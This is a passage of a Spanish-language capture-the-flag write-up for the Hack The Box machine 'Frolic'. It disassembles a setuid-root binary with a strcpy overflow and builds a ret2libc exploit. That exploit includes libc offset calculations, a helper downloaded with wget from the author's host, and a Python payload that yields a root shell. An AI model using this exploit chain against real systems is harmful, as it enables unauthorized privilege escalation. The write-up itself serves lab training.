│       │   0x080484c6      e895feffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x080484cb      83c410         add esp, 0x10
│       │   0x080484ce      b8ffffffff     mov eax, 0xffffffff         ; -1
│      ┌──< 0x080484d3      eb19           jmp 0x80484ee
│      ││   ; CODE XREF from main (0x80484bc)
│      │└─> 0x080484d5      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
│      │    0x080484d8      83c004         add eax, 4
│      │    0x080484db      8b00           mov eax, dword [eax]
│      │    0x080484dd      83ec0c         sub esp, 0xc
│      │    0x080484e0      50             push eax
│      │    0x080484e1      e812000000     call sym.vuln
│      │    0x080484e6      83c410         add esp, 0x10
│      │    0x080484e9      b800000000     mov eax, 0
│      │    ; CODE XREF from main (0x80484d3)
│      └──> 0x080484ee      8d65f8         lea esp, [var_8h]
│           0x080484f1      59             pop ecx
│           0x080484f2      5b             pop ebx
│           0x080484f3      5d             pop ebp
│           0x080484f4      8d61fc         lea esp, [ecx - 4]
└           0x080484f7      c3             ret
[0x080484f8]> pdf @sym.vuln
┌ (fcn) sym.vuln 58
│   sym.vuln (int arg_8h);
│           ; var int var_30h @ ebp-0x30
│           ; arg int arg_8h @ ebp+0x8
│           ; CALL XREF from main (0x80484e1)
│           0x080484f8      55             push ebp
│           0x080484f9      89e5           mov ebp, esp
│           0x080484fb      83ec38         sub esp, 0x38               ; '8'
│           0x080484fe      83ec08         sub esp, 8
│           0x08048501      ff7508         push dword [arg_8h]
│           0x08048504      8d45d0         lea eax, [var_30h]
│           0x08048507      50             push eax
│           0x08048508      e843feffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x0804850d      83c410         add esp, 0x10
│           0x08048510      83ec0c         sub esp, 0xc
│           0x08048513      68dd850408     push str.Message_sent:      ; 0x80485dd ; "[+] Message sent: "
│           0x08048518      e823feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0804851d      83c410         add esp, 0x10
│           0x08048520      83ec0c         sub esp, 0xc
│           0x08048523      8d45d0         lea eax, [var_30h]
│           0x08048526      50             push eax
│           0x08048527      e814feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0804852c      83c410         add esp, 0x10
│           0x0804852f      90             nop
│           0x08048530      c9             leave
└           0x08048531      c3             ret
[0x080484f8]> q
```

Aquí tenemos varias cosas, lo único que hice fue pasar el análisis experimental del binario, listar las funciones, y imprimir la función vuln y main.

La función `sym.imp.setuid` vemos que es lanzada con el parámetro 0, esto significa que a quien lo ejecute se le dará el poder del todopoderoso usuario root. Se evalúa si se recibió más de un argumento, de no ser así se imprime el mensaje de uso del binario. El programa continua pasando el argumento\[1\] de main a la función vuln.

En vuln, declaramos el stack frame de 0x38 o 56 en decimal, volvemos a restarle 8 bytes mas, con un total de 64. Subimos el argumento que recibimos de main a ESP, guardamos la dirección de EBP-0x30 en EAX, subiendo finalmente este al ESP+0x4. Llamamos a string copy, el cual recibió la dirección de destino (EBP-0x30) y el origen argumento de main, el cual salva en EBP-0x30 el valor del string que pasemos como argumento en main.

La función vulnerable básicamente lo que hace después es imprimir primero "\[+\] Message sent: " + el contenido de el argumento de main. Lo peligroso de esta función, es que strcpy copio tal cual lo que recibe del origen hasta encontrar un `\x00`. No valida que el destino soporte el tamaño completo del origen. Solo le interesa copiar y pegar hasta encontrar un NULL. Esto nos permite como atacantes poder abusar y hacer un buffer overflow al salirnos de EBP-0x30.

Por lo que si subo 0x30 + 4 bytes que es donde debería estar la EBP (dirección del puntero base), estaríamos llegando al EIP (dirección de retorno):

Si esto fuera un simple buffer overflow, aquí estaría subiendo un shellcode para ejecutarlo después, pero este no es nuestro escenario:

Analicemos con checksec:

| RELRO         | STACK CANARY    | NX         | PIE    | RPATH    | RUNPATH    | Symbols    | FORTIFY | Fortified | Fortifiable | FILE |
|---------------|-----------------|------------|--------|----------|------------|------------|---------|-----------|-------------|------|
| Partial RELRO | No canary found | NX enabled | No PIE | No RPATH | No RUNPATH | 73 Symbols | No      | 0         | 4           | rop  |

Tenemos habilitado NX que no nos permite ejecutar cosas en el stack, no tenemos canarios que estén entrando y saliendo al stack, ni PIE ni ASLR:

```text
$ cat /proc/sys/kernel/randomize_va_space
0
```

Esto es bueno, porque no tenemos la dirección de las bibliotecas dinamicamente importadas cambiando todo el tiempo.

Esto significa que siempre podemos tener la misma dirección base para _libc_, la cual es 0xb7e19000 (ldd mas arriba).

Ahora, la estrategia que estaremos usando para explotar el binario es un ret2libc, el cual consiste en llamar desde el EIP a funciones de LIBC concatenando sus argumentos como si fuera unas llamadas normales y comunes.

Lo que estaremos realizando es un `system("/bin/sh");` por lo que necesitamos un par de cosas para poder armar el exploit.

- Conocer cual es la dirección base de _libc_
- Conocer donde esta _system_ dentro de _libc_ para poder llamarla
- Encontrar donde esta el string "/bin/sh" durante la ejecución del binario
- Conocer donde esta _exit_ dentro de _libc_ para darle un retorno después que cierre la shell.

El ultimo requerimiento es básicamente para que cuando llame a _system_, pueda funcionar como si fuera una llamada legal, indicándole a donde retornar al finalizar, que en este caso seria mandarlo a _exit_. La forma de verlo es como una construcción de stack virtual dentro del stack, ya que al llamar una función, esta debe saber vía el stack donde regresar ya que el stack y los registros es lo único compartido.

Ya habíamos encontrado la dirección base de _libc_ vía `ldd`, la cual no cambia porque la protección global no esta habilitada (address space layout randomization), ahora solo falta resolver como llegar a _system_ y _exit_. Eso lo podemos hacer ejecutando `readelf` sobre `libc.so.6` dentro o fuera de frolic. En mi caso lo hice fuera:

```text
xbytemx@laptop:~/htb/frolic$ readelf -s libc.so.6 | grep -E " (system|exit)@@"
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

Básicamente liste todos los símbolos dentro de la biblioteca, los cuales son los entry points para las funciones. Concatene esa salida a grep y por un regex filtre system y exit, obteniendo donde se encuentran dentro de _libc_. Ahora sumamos esta dirección (offset) + la base de donde se encuentra dentro de la memoria _libc_, y tenemos la ubicación de la función durante la ejecución:

```text
xbytemx@laptop:~/htb/frolic$ rax2 -k 0x0002e9d0+0xb7e19000
0xb7e479d0
xbytemx@laptop:~/htb/frolic$ rax2 -k 0xb7e19000+0x0003ada0
0xb7e53da0
```

Ahora, ¿cómo demonios encontramos donde esta "/bin/sh"? Aquí es donde tuve muchas dificultades. Ya que la estrategia tradicional seria insertarlo por una variable, pero no tenia idea de como poder saber donde encontrar en memoria una variable declarada dentro de bash. Afortunadamente encontré el siguiente código en C para exportar la dirección de la variable SHELL:

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
    char *p = getenv("SHELL");
    printf("SHELL is at %p\n", p);
    return 0;
}
```

Lo primero y obligado, es declarar SHELL o cualquier otra variable con el string "/bin/sh". Compilamos el código y generamos un binario para x86:

```text
xbytemx@laptop:~/htb/frolic$ cat getSHELLenvvar.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
    char *p = getenv("SHELL");
    printf("SHELL is at %p\n", p);
    return 0;
}

xbytemx@laptop:~/htb/frolic$ gcc -m32 -o getSHELLenvvar getSHELLenvvar.c
```

Subimos el binario generado a frolic y lo ejecutamos:

```text
$ cd /dev/shm
$ wget http://10.10.12.82:4001/getSHELLenvvar
--2019-03-22 10:22:53--  http://10.10.12.82:4001/getSHELLenvvar
Connecting to 10.10.12.82:4001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15488 (15K) [application/octet-stream]
Saving to: 'getSHELLenvvar'

     0K .......... .....                                      100% 75.8K=0.2s

2019-03-22 10:22:53 (75.8 KB/s) - 'getSHELLenvvar' saved [15488/15488]

$ chmod u+x getSHELLenvvar
$ ./getSHELLenvvar
SHELL is at 0xbfffffdb
```

Donde, ahora tenemos la dirección de donde esta el string "/bin/sh".

Ahora que tenemos todos los requerimientos construimos el ret2libc y ejecutamos rop con sus argumentos vía python. Recordemos que debido a como el endianess funciona en x86, hay que invertir el orden de los pares de bytes (32bits):

```text
$ /home/ayush/.binary/rop $(python -c 'print "B"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\xbd\xff\xff\xbf"')
id
uid=0(root) gid=33(www-data) groups=33(www-data)
pwd
/dev/shm
```

# `cat root.txt`

```text
cat /root/root.txt
```

... and we got root flag and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
